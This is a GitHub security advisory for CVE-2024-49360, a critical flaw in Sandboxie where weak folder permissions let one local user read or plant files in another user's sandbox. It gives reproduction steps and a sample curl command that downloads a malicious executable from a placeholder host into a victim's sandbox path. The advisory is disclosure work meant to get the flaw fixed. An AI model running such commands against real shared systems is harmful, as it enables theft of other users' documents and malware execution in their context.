=== Content from github.com_8bbab881_20250114_222127.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsandboxie-plus%2FSandboxie%2Fsecurity%2Fadvisories%2FGHSA-4chj-3c28-gvmp)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsandboxie-plus%2FSandboxie%2Fsecurity%2Fadvisories%2FGHSA-4chj-3c28-gvmp)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=sandboxie-plus%2FSandboxie)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sandboxie-plus](/sandboxie-plus)
/
**[Sandboxie](/sandboxie-plus/Sandboxie)**
Public

* [Notifications](/login?return_to=%2Fsandboxie-plus%2FSandboxie) You must be signed in to change notification settings
* [Fork
  1.6k](/login?return_to=%2Fsandboxie-plus%2FSandboxie)
* [Star
   14.2k](/login?return_to=%2Fsandboxie-plus%2FSandboxie)

* [Code](/sandboxie-plus/Sandboxie)
* [Issues
  587](/sandboxie-plus/Sandboxie/issues)
* [Pull requests
  7](/sandboxie-plus/Sandboxie/pulls)
* [Discussions](/sandboxie-plus/Sandboxie/discussions)
* [Actions](/sandboxie-plus/Sandboxie/actions)
* [Projects
  0](/sandboxie-plus/Sandboxie/projects)
* [Security](/sandboxie-plus/Sandboxie/security)
* [Insights](/sandboxie-plus/Sandboxie/pulse)

Additional navigation options

* [Code](/sandboxie-plus/Sandboxie)
* [Issues](/sandboxie-plus/Sandboxie/issues)
* [Pull requests](/sandboxie-plus/Sandboxie/pulls)
* [Discussions](/sandboxie-plus/Sandboxie/discussions)
* [Actions](/sandboxie-plus/Sandboxie/actions)
* [Projects](/sandboxie-plus/Sandboxie/projects)
* [Security](/sandboxie-plus/Sandboxie/security)
* [Insights](/sandboxie-plus/Sandboxie/pulse)

# Path traversal in C:\Sandbox\

Critical

[DavidXanatos](/DavidXanatos)
published
GHSA-4chj-3c28-gvmp
Nov 28, 2024

## Package

Sandboxie Core
(Sandboxie Core)

## Affected versions

< v1.14.6 / 5.69.6

## Patched versions

None

## Description

### Summary

An authenticated user (**UserA**) with no privileges is authorized to read all files created in sandbox belonging to other users in the sandbox folders `C:\Sandbox\UserB\xxx`.

### Details

An authenticated attacker who can use `explorer.exe` or `cmd.exe` outside any sandbox can read other users' files in `C:\Sandbox\xxx`.

By default in Windows 7+, the `C:\Users\UserA` folder is not readable by **UserB**.

All files edited or created during the sandbox processing are affected by the vulnerability. All files in C:\Users are safe.

~~Note: If `UserB` runs a cmd in a sandbox, it won't be able to access `C:\Sandox`, which is a good thing.~~

**UPDATE**: If `UserB` runs a cmd in a sandbox, he will be able to access `C:\Sandox\UserA` !

**UPDATE 2**: In addition, if **UserB** create a folder `C:\Sandbox\UserA` with malicious ACLs, when **UserA** will user the sandbox, Sandboxie doesn't reset ACLs !

### PoC

1. Create two users `net user /add UserA passwordA` ; `net user /add UserB passwordB`
2. Run a simple `cmd.exe` in a `Standard Sandbox` with **UserA** and create any file (ie `echo example > C:\example`)
3. Run a `cmd.exe` as **UserB** outside of any sandboxes. Then cat the file `C:\Sandbox\UserA\drive\c\example`

   Example with personnal folder:

   [![image](https://private-user-images.githubusercontent.com/5358076/363639632-e59e3cd7-7974-4d5a-a018-43cb786c5a10.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM1ODYsIm5iZiI6MTczNjg5MzI4NiwicGF0aCI6Ii81MzU4MDc2LzM2MzYzOTYzMi1lNTllM2NkNy03OTc0LTRkNWEtYTAxOC00M2NiNzg2YzVhMTAucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjIyMTI2WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OWYzZGU0M2IxOGUwZDVhYjU1Y2UwNTZhYzdmOTkwYzJhMjY1ZTcyOTAyNWEyMGZmNjQ3ODg3MjJiOTlmYmJmMCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.tX-o9O2fpqKcLD-pjG3wocpuiYjb-0sEME0j1iW5Doc)](https://private-user-images.githubusercontent.com/5358076/363639632-e59e3cd7-7974-4d5a-a018-43cb786c5a10.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM1ODYsIm5iZiI6MTczNjg5MzI4NiwicGF0aCI6Ii81MzU4MDc2LzM2MzYzOTYzMi1lNTllM2NkNy03OTc0LTRkNWEtYTAxOC00M2NiNzg2YzVhMTAucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjIyMTI2WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OWYzZGU0M2IxOGUwZDVhYjU1Y2UwNTZhYzdmOTkwYzJhMjY1ZTcyOTAyNWEyMGZmNjQ3ODg3MjJiOTlmYmJmMCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.tX-o9O2fpqKcLD-pjG3wocpuiYjb-0sEME0j1iW5Doc)

### Impact

This case is quite critical in shared environments such as RDS / Citrix :

[![Multiple users on one RDS server](https://private-user-images.githubusercontent.com/5358076/363639695-dfedccf3-487a-438a-95d9-8502ed50c744.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM1ODYsIm5iZiI6MTczNjg5MzI4NiwicGF0aCI6Ii81MzU4MDc2LzM2MzYzOTY5NS1kZmVkY2NmMy00ODdhLTQzOGEtOTVkOS04NTAyZWQ1MGM3NDQucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjIyMTI2WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MmYwNTVhNzZkYTViZTUyZmM4ODc2ZDYzZDVkZWM3ODllOGQ4ZDRlOGY4NzRmYmIzNjBjMzRmZGRkNGI4MWQ4YSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.UHZbTzTpA77u9H0VBoyC5BTYGNtoAuOjPCJe2WUU238)](https://private-user-images.githubusercontent.com/5358076/363639695-dfedccf3-487a-438a-95d9-8502ed50c744.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTM1ODYsIm5iZiI6MTczNjg5MzI4NiwicGF0aCI6Ii81MzU4MDc2LzM2MzYzOTY5NS1kZmVkY2NmMy00ODdhLTQzOGEtOTVkOS04NTAyZWQ1MGM3NDQucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjIyMTI2WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MmYwNTVhNzZkYTViZTUyZmM4ODc2ZDYzZDVkZWM3ODllOGQ4ZDRlOGY4NzRmYmIzNjBjMzRmZGRkNGI4MWQ4YSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.UHZbTzTpA77u9H0VBoyC5BTYGNtoAuOjPCJe2WUU238)

An attacker was able to hijack sensitives documents from other users.

**Scenario 2**: An attacker can put a malicous file into the sandbox of other users and gain `UserA`'s sandboxed context. If a attacker (`UserB`) puts a malicious binary into another user's (`UserA`) sandbox, the attacker will gain temporary access into UserA's sandboxed context.

Example:

```
PS C:\> whoami
UserB
PS C:\> # not sandboxed
PS C:\> curl.exe https://xxx/malicious.exe --output C:\Sandbox\UserA\New_Box\drive\C\PaymentSystem\pay.exe
```

When UserA executes `pay.exe` the `New_Box` sandbox, instead of `pay.exe`, malware is executed.

### Fix

When creating the user directory in the sandbox (`C:\Sandbox\xxx`), Sandboxie must change the ACL of the user folder (`C:\Sandbox\xxx`) to (ACL on this folder, subfolder and all files)

* Creator Owner: FULL
* UserXXXXX: Full

  💥These ACLs **must** be reset before running any process in the sandbox.

I tried to change ACL of `C:\Sandbox` but if you know the username it's still possible to read all files because ACL set on `C:\Sandbox\xxx` are weak

### Sandboxie configuration

```
[GlobalSettings]
DefaultBox=New_Box
# Enable network filtering
NetworkEnableWFP=y
# Temporary storage of files
FileRootPath=\??\%SystemDrive%\Sandbox\%USER%\%SANDBOX%
# Temporary storage of registry
KeyRootPath=\REGISTRY\USER\Sandbox_%USER%_%SANDBOX%
# Temporary storage of IPC ccommunications
IpcRootPath=\Sandbox\%USER%\%SANDBOX%\Session_%SESSION%
Template=WindowsRasMan
Template=WindowsLive
Template=OfficeLicensing
Template=7zipShellEx
Template=Edge_Fix
Template=OfficeClickToRun
# Only local admins are allowed to edit this file
# It’s possible to add a password to protect the file, but the update of this file will be possible only via the GUI
EditAdminOnly=y
ForceDisableAdminOnly=y
ForgetPassword=y
# Avoid the tray icon
SbieCtrl_AutoStartAgent=
SbieCtrl_EnableAutoStart=n
SbieCtrl_EnableLogonStart=n
# Set default user’s pref
SbieCtrl_AddDesktopIcon=n
SbieCtrl_AddQuickLaunchIcon=n
SbieCtrl_AddContextMenu=n
SbieCtrl_AddSendToMenu=n
SbieCtrl_AutoRunSoftCompat=n
SbieCtrl_HideMessage=*
SbieCtrl_HideWindowNotify=y
RunCommand=cmd|cmd.exe
ForceDisableSeconds=30

[UserSettings_Default]
# Set default user’s pref
SbieCtrl_AddDesktopIcon=n
SbieCtrl_AddQuickLaunchIcon=n
SbieCtrl_AddContextMenu=n
SbieCtrl_AddSendToMenu=n
SbieCtrl_AutoStartAgent=
SbieCtrl_EnableAutoStart=n
SbieCtrl_EnableLogonStart=n
SbieCtrl_HideWindowNotify=y
SbieCtrl_HideMessage=*
SbieCtrl_AutoRunSoftCompat=n

[New_Box]
Enabled=y
BlockNetworkFiles=y
BorderColor=#02f6f6,ttl
Template=OpenBluetooth
Template=SkipHook
Template=FileCopy
Template=qWave
Template=BlockPorts
Template=LingerPrograms
Template=AutoRecoverIgnore
ConfigLevel=10
UseFileDeleteV2=y
UseRegDeleteV2=y
AutoRecover=n
```

### Severity

Critical

9.2

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
Low

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L

### CVE ID

CVE-2024-49360

### Weaknesses

[CWE-276](/advisories?query=cwe%3A276)

### Credits

* [![@1mm0rt41PC](https://avatars.githubusercontent.com/u/5358076?s=40&v=4)](/1mm0rt41PC)
  [1mm0rt41PC](/1mm0rt41PC)
  Reporter
* [![@PMain](https://avatars.githubusercontent.com/u/44119463?s=40&v=4)](/PMain)
  [PMain](/PMain)
  Finder
* [![@Sberlos](https://avatars.githubusercontent.com/u/36778258?s=40&v=4)](/Sberlos)
  [Sberlos](/Sberlos)
  Finder

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


